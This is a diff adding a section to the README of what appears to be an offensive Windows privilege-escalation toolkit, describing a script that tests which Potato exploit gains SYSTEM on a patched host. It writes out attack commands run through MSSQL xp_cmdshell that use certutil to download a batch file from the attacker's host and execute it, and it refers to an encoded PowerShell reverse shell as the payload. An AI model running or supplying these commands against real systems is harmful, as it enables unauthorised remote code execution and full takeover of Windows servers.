@@ -89,6 +89,20 @@ Set `TOOL` in **`_winpriv_common.py`** (one place, all three scripts read it); d
 
 `<CMD>` = `powershell -e <REV_B64>` (the SYSTEM revshell) for every tool. **Swap `TOOL`, re-run the same generator — no per-tool setup.**
 
+## Which Potato works here? — `gen_potato_scan.py` finds out for you
+Modern-patched Windows (KB5004442 DCOM hardening + friends) breaks *different* Potato callback paths on different boxes — SweetPotato may hang, GodPotato may return 1058, RoguePotato may spawn nothing. Rather than hand-editing `TOOL` and re-running gen_full/forma/nonet between attempts, run the auto-scanner once:
+```bash
+python3 gen_potato_scan.py > pscan.bat            # emits ONE batch that probes every staged Potato
+sudo python3 -m http.server 80                    # serve it
+```
+On target (via mssqlclient / xp_cmdshell):
+```sql
+EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/pscan.bat C:\Windows\Temp\pscan.bat';
+EXEC master..xp_cmdshell 'C:\Windows\Temp\pscan.bat';
+```
+It fires each staged Potato against a **benign `whoami > marker` probe** (no revshell, no AV signal), hard-times-out hangs, and prints `[+] TOOL WORKS — SYSTEM confirmed` for each survivor. Set `TOOL` in `_winpriv_common.py` to a winner and re-run gen_full / gen_forma / gen_nonet as usual.
+Flags: `python3 gen_potato_scan.py --include-rogue` (also probes RoguePotato — needs the socat OXID redirector on your box) · `--stagedir "D:\path"` · `--timeout 8` (per-tool hard-kill seconds; default 6) · positional args restrict the scan to specific tools.
+
 ## Always-first setup
 ```bash
 cd <this dir>
